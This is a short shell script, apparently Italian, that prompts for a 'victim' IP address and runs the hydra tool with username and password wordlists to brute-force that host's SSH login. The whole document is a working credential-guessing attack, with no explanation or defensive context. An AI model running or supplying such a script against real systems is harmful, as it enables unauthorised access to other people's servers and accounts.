service ssh start

echo "ip vittima"

read ip

hydra -L names.txt -P passwd.txt -t 8 $ip ssh

 
